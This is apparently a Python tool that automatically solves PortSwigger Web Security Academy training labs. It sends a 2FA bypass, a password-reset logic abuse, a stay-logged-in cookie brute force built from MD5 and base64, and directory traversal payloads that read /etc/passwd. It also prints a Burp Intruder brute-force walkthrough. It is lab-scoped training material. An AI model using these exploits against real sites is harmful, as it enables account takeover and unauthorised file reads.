#!/usr/bin/python3
import os
import sys
import time
import signal
import base64
import hashlib
import warnings
import requests
from tqdm import tqdm
from art import text2art
from rich.console import Console

# Special thanks to Rana Khalil for teaching me the knowledge to write this tool by "Web Security Academy Series Course"

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

s = requests.Session()

warnings.filterwarnings("ignore")


def signal_handler(signal, frame):
    print("\nPlease write \"exit\" to exit!")


signal.signal(signal.SIGINT, signal_handler)


def paas():
    os.system('clear')
    art=text2art("PAAS")
    print(art)
    print("[P]ortSwigger [A]cademy [A]utomatic [S]olver")
    print("by mr246\n")
    loadingEffect("", 0.4)


def loadingEffect(effectText, effectTime):
    console = Console()
    with console.status(f"[bold green]{effectText}"):
        time.sleep(effectTime)


def ex():
    print("\nGoodbye! :D")
    sys.exit()


def pressAnyKey():
    loadingEffect("...", 1)
    input("\npress any key to continue...")
    paas()


def checkUrl(url):
    if url.endswith('/'):
        url = url[:-1]
    return url


def createUserList(labName):
    input("\npress any key to see user list...")

    loadingEffect("creating user list...", 2)

    paas()
    print("userlist successfully created!\n")

    print("==== USER LIST ====")
    if labName == "Auth3":
        for i in range(150):
            if i % 3:
                print("carlos")
            else:
                print("wiener")
    print("==== THE END OF THE USER LIST ====")

    input("\npress any key to continue")
    paas()


def createPasswordList(labName):
    input("\npress any key to see password list...")

    loadingEffect("creating password list...", 2)

    paas()
    print("password list successfully created!\n")

    print("==== PASSWORD LIST ====")
    if labName == "Auth3":
        with open("auth3p", "r") as p:
            passwords = p.readlines()

        i = 0
        for pwd in passwords:
            if i % 3:
                print(pwd.strip("\n"))
            else:
                print("peter")
                print(pwd.strip("\n"))
                i = i +1
            i = i +1
    print("==== THE END OF THE PASSWORD LIST ====")

    input("\npress any key to continue")
    paas()


def invalidCharacterNumber():
    print("Enter a valid category number!")
    print("It is not a valid category number.")
    loadingEffect("tool is closing...", 1.5)
    sys.exit(-1)


def authentication():
    paas()
    print("== Authentication Menu ==")
    menu_options = {
        1: "Lab: 2FA Simple Bypass",
        2: "Lab: Password reset broken logic",
        3: "Lab: Broken brute-force protection, IP block",
        4: "Lab: Brute-forcing a stay-logged-in cookie"
    }
    for key, value in menu_options.items():
        print(f"[{key}] {value}")

    inpt = input("\nSelect Lab: ")

    if inpt == "exit":
        ex()
    elif int(inpt) == 1:
        auth_lab1()
    elif int(inpt) == 2:
        auth_lab2()
    elif int(inpt) == 3:
        auth_lab3()
    elif int(inpt) == 4:
        auth_lab4()
    elif int(inpt) <= 1 or int(inpt) >= 5:
        invalidCharacterNumber()


def auth_lab1():

    paas()
    print("== Authentication/2FA Simple Bypass ==")
    print("example: https://lab-id.web-security-academy.net/")

    url = checkUrl(input("url: "))

    # Log into Carlos's account
    paas()
    print("(+) Logging into account and bypassing 2FA verification...")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "montoya"}
    r = s.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)

    # Confirm bypass
    myaccount_url = url + "/my-account"
    r = s.get(myaccount_url, verify=False, proxies=proxies)
    if "Log out" in r.text:
        paas()
        print("(+) Successfully bypassed 2FA verification.")
        print("(+) enjoy :D")
    else:
        print("(-) Exploit failed.")
        sys.exit(-1)


def auth_lab2():
    paas()
    print("== Authentication/Password reset broken logic ==\n")
    print("example: https://lab-id.web-security-academy.net/")

    url = checkUrl(input("url: "))

    # Reset Carlos's password
    pass_reset_url = url + "/forgot-password?temp-forgot-password-token=ilovekokorec"
    pass_reset_data = {"temp-forgot-password-token": "ilovekokorec", "username": "carlos", "new-password-1": "kokorec", "new-password-2": "kokorec"}
    r = s.post(pass_reset_url, data=pass_reset_data, verify=False, proxies=proxies)

    # Access Carlos's account
    paas()
    print("(+) Logging into account...")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "kokorec"}
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)

    # Confirm exploit worked
    if "Log out" in r.text:
        paas()
        print("(+) Successfully logged into Carlos's account.")
        print("(+) enjoy :D")
    else:
        print("(-) Exploit failed.")
        sys.exit(-1)


def auth_lab3():
    paas()
    print("== Authentication/Broken brute-force protection, IP block ==\n")
    print("This lab is not have fully automated solve in PAAS.")
    print("Follow the instructions for the solve the lab.")
    pressAnyKey()

    # Lab instructions
    print("== Authentication/Broken brute-force protection, IP block ==\n")
    print("[1] Capture login request in Burp and right click send to Intruder")
    print("[2] Intruder -> Resource Pool -> select \"Create new resource pool\"\n-> select \"Maximum concurrent requests\" and set to 1")
    pressAnyKey()

    print("== Authentication/Broken brute-force protection, IP block ==\n")
    print("[3] Select \"Pitchfork\" attack type")
    print("[4] Positions -> click \"clear\", select both of username and password inputs and click \"add\"")
    print("example: \"username=§wiener§&password=§peter§\"")
    pressAnyKey()

    print("== Authentication/Broken brute-force protection, IP block ==\n")
    print("[5] Copy the username list below after pressing any key and paste it for \"payload set 1\" in the \"Payloads\"")

    # creating user list
    createUserList("Auth3")

    print("[6] Copy the pasword list below after pressing any key and paste it for \"payload set 2\" in the \"Payloads\"")

    # creating password list
    createPasswordList("Auth3")

    print("[7] Click \"Start attack\" and wait until the attack is over")
    print("[8] Sort the list by \"Status\" 302")
    print("[9] The password in the column where carlos is 302 is correct password")
    print("[10] Login to the site with this credentials and solve the lab")
    pressAnyKey()
    print("Congratulations!")
    print("See you in the next lab! :D")
    sys.exit(-1)


def auth_lab4():
    paas()
    print("== Authentication/Brute-forcing a stay-logged-in cookie ==\n")
    print("example: https://lab-id.web-security-academy.net/")

    url = checkUrl(input("url: "))

    print("\nGenerating cookies and running attack...")

    with open("auth4p", "r") as p:
        for pwd in p:
            hashed_pass = hashlib.md5(pwd.rstrip("\n").encode("utf-8")).hexdigest()
            username_hashed_pass = "carlos:" + hashed_pass
            encoded_pass = base64.b64encode(bytes(username_hashed_pass, "utf-8"))
            true_creds = encoded_pass.decode("utf-8")

            myaccount_url = url + "/my-account"
            cookies = {"stay-logged-in": true_creds}
            req = s.get(myaccount_url, cookies=cookies, verify=False, proxies=proxies)
            if "Log out" in req.text:
                print(f"\n[+] Valid credentials found! \nCredentials: carlos:{pwd}")
                sys.exit(-1)
        print("[-] Attack failed!")

def directoryTraversal():
    paas()
    print("== Directory Traversal Menu ==")
    menu_options = {
        1: "Lab: File path traversal, simple case",
        2: "Lab: Traversal sequences blocked with absolute path bypass",
        3: "Lab: Traversal sequences stripped non-recursively"
    }
    for key, value in menu_options.items():
        print(f"[{key}] {value}")

    inpt = input("\nSelect Lab: ")

    if inpt == "exit":
        ex()
    elif int(inpt) == 1:
        dir_traversal_lab123(1)
    elif int(inpt) == 2:
        dir_traversal_lab123(2)
    elif int(inpt) == 3:
        dir_traversal_lab123(3)
    elif int(inpt) == 4:
        auth_lab4()
    elif int(inpt) <= 1 or int(inpt) >= 5:
        invalidCharacterNumber()

def dir_traversal_lab123(option):
    paas()
    print("== Directory Traversal ==\n")
    print("example: https://lab-id.web-security-academy.net/")

    url = checkUrl(input("url: "))
    if option == 1:
        image_url = url + "/image?filename=../../../../etc/passwd"
    elif option == 2:
        image_url = url + "/image?filename=/etc/passwd"
    elif option == 3:
        image_url = url + "/image?filename=....//....//....//etc/passwd"

    s = requests.get(image_url, verify=False, proxies=proxies)
    if "root:x" in s.text:
        loadingEffect("attacking", 3)
        print("\n[+] attack successfully completed.")
        print("\n==== CONTENT OF THE /etc/passwd FILE ====\n")
        print(s.text)
        print("==== END OF THE /etc/passwd FILE ====")
    else:
        print("\n[-] Exploit failed.")
        sys.exit(-1)

def main():

    # paas ascii art
    paas()

    # loading bar
    for i in tqdm(range(100),
                  desc="Loading…",
                  ascii=False):
        time.sleep(0.006)
    paas()
    time.sleep(0.4)

    # main menu
    menu_options = {
        1: "Authentication Labs",
        2: "Directory Traversal Labs",
        3: "SQLi Labs",
        4: "XSS Labs"
    }
    for key, value in menu_options.items():
        print(f"[{key}] {value}")

    try:
        inpt = input("\nSelect Vulnerability: ")
        if inpt == "exit":
            ex()
        elif int(inpt) == 1:
            authentication()
        elif int(inpt) == 2:
            directoryTraversal()
        elif int(inpt) == 3:
            print("coming soon...")
            sys.exit(-1)
        elif int(inpt) <= 0 or int(inpt) >= 4:
            print("Enter a valid category number!")
            print(inpt + " is not a valid category number.")
            text = "resetting"
            for i in range(1, 4):
                print("\r" + text + "." * i, end="")
                time.sleep(1)
            main()
    except Exception as e:
        paas()
        print(e)
        print("Invalid Input!")
        loadingEffect("tool is closing...", 2)
        sys.exit(-1)


if __name__ == "__main__":
    main()
